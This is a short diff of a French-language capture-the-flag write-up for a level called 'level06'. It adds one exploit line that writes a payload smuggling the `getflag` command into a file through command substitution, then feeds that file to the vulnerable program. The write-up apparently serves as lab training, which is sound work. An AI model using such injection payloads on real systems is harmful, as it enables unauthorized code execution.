@@ -24,3 +24,5 @@
    - **Description :** Exécuter le code malveillant injecté dans la fonction "y".
    - **Solution :** Les étapes suivantes ont été réalisées :
      - Lancement du programme "level06" en utilisant le fichier "exploit" avec `./level06 /tmp/exploit`.
+
+`echo '[x ${`getflag`}]' > /tmp/exploit; ./level06 /tmp/exploit`
